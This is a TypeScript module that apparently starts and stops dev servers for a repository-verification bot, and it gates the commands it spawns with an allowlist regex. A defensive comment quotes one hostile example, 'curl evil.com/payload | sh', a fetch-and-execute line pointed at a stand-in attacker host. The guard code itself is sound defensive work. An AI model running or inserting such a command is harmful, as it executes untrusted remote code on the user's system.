import { spawn } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

export type ServerHandle = {
  port: number;
  pid: number;
  stop: () => Promise<void>;
};

type StartResult =
  | { ok: true; handle: ServerHandle }
  | { ok: false; error: string };

/** Poll `http://127.0.0.1:${port}/` every 500 ms until ANY HTTP response comes back. */
async function waitForPort(port: number, timeoutMs: number): Promise<boolean> {
  const deadline = Date.now() + timeoutMs;
  const url = `http://127.0.0.1:${port}/`;
  while (Date.now() < deadline) {
    try {
      await fetch(url, { signal: AbortSignal.timeout(500) });
      return true;
    } catch {
      // Not ready yet — wait 500 ms before retrying.
      await new Promise((r) => setTimeout(r, 500));
    }
  }
  return false;
}

/** Returns true if the port is already serving (to guard against collisions). */
async function isPortInUse(port: number): Promise<boolean> {
  try {
    await fetch(`http://127.0.0.1:${port}/`, { signal: AbortSignal.timeout(1_000) });
    return true;
  } catch {
    return false;
  }
}

/**
 * Whitelist for dev-server commands. A malicious target repo can stuff
 * `"bot:smoke": "curl evil.com/payload | sh"` into its package.json and the
 * runtime-verification phase would shell it out. We constrain the command to
 * known package-runner prefixes + safe characters. Anything else returns an
 * error and the runtime check is skipped.
 *
 * QA2: tightened from Round 1. `..` substrings are explicitly rejected (no
 * path-traversal into the parent), and leading `/` in any argument is
 * rejected (no absolute paths like `node /etc/passwd`). Still uses
 * `shell: true` because `npm run dev` itself relies on shell expansion to
 * execute the script — the regex is the gate, the shell can't undo it.
 *
 * What this can NOT defend against: a malicious `package.json` script that
 * the model invokes via `npm run dev` — the script content is the target
 * repo's, not ours. That risk is mitigated by the per-repo opt-in for
 * runtime verification (see `runtime/index.ts`).
 */
const SAFE_COMMAND_RE =
  /^(npm|npx|pnpm|yarn|node|next|vite|nest|cargo|python|python3|uvicorn|gunicorn|deno|bun|tsx)(\s+[a-zA-Z0-9_.@:\-]+(?:\/[a-zA-Z0-9_.@:\-]+)*)+$/;

export function isCommandSafe(command: string): boolean {
  const trimmed = command.trim();
  if (!trimmed) return false;
  // No path-traversal substrings anywhere.
  if (trimmed.includes("..")) return false;
  // No absolute paths in any argument position. The regex disallows it via
  // requiring a non-`/` first char in each arg, but this is the readable
  // double-check.
  if (/(\s|^)\//.test(trimmed)) return false;
  // No newlines, tabs, or other control characters.
  if (/[\x00-\x1f]/.test(trimmed)) return false;
  return SAFE_COMMAND_RE.test(trimmed);
}

export async function startDevServer(args: {
  cwd: string;
  command: string;
  port: number;
  readyTimeoutMs?: number;
  env?: Record<string, string>;
}): Promise<StartResult> {
  const { cwd, command, port, readyTimeoutMs = 60_000, env = {} } = args;

  if (!isCommandSafe(command)) {
    return {
      ok: false,
      error: `Refused to spawn dev server: command "${command.slice(0, 80)}" failed safety check`,
    };
  }

  if (await isPortInUse(port)) {
    return { ok: false, error: `port ${port} already in use` };
  }

  const logDir = os.tmpdir();
  const logBase = `42nbot-server-${Date.now()}`;
  const stdoutLog = fs.openSync(path.join(logDir, `${logBase}.stdout`), "w");
  const stderrLog = fs.openSync(path.join(logDir, `${logBase}.stderr`), "w");

  const child = spawn(command, {
    shell: true,
    detached: true,
    cwd,
    stdio: ["ignore", stdoutLog, stderrLog],
    env: { ...process.env, PORT: String(port), ...env },
  });

  fs.closeSync(stdoutLog);
  fs.closeSync(stderrLog);

  // If the process exits immediately (command not found, bad script), surface it.
  let spawnError: Error | null = null;
  await new Promise<void>((resolve) => {
    child.once("error", (err) => {
      spawnError = err;
      resolve();
    });
    // Give it 200 ms — if it hasn't errored by then, the process is running.
    setTimeout(resolve, 200);
  });

  if (spawnError) {
    return { ok: false, error: (spawnError as Error).message };
  }

  if (child.exitCode !== null) {
    return {
      ok: false,
      error: `dev server process exited immediately with code ${child.exitCode}`,
    };
  }

  // Detach so the parent process doesn't keep it alive inadvertently.
  child.unref();

  const ready = await waitForPort(port, readyTimeoutMs);
  if (!ready) {
    // Best-effort kill before returning failure.
    try {
      process.kill(-(child.pid!), "SIGTERM");
    } catch {
      /* ignore */
    }
    return { ok: false, error: `dev server did not become ready within ${readyTimeoutMs}ms` };
  }

  const stop = async (): Promise<void> => {
    const pid = child.pid;
    if (pid == null) return;
    const killGroup = (sig: NodeJS.Signals) => {
      try {
        process.kill(-pid, sig);
      } catch {
        /* already dead */
      }
    };

    killGroup("SIGTERM");

    // Wait up to 5s for clean exit.
    const deadline = Date.now() + 5_000;
    while (Date.now() < deadline) {
      try {
        process.kill(pid, 0); // probe — throws if dead
        await new Promise((r) => setTimeout(r, 200));
      } catch {
        return; // process is gone
      }
    }

    // Still alive — force kill.
    killGroup("SIGKILL");
  };

  return {
    ok: true,
    handle: { port, pid: child.pid!, stop },
  };
}
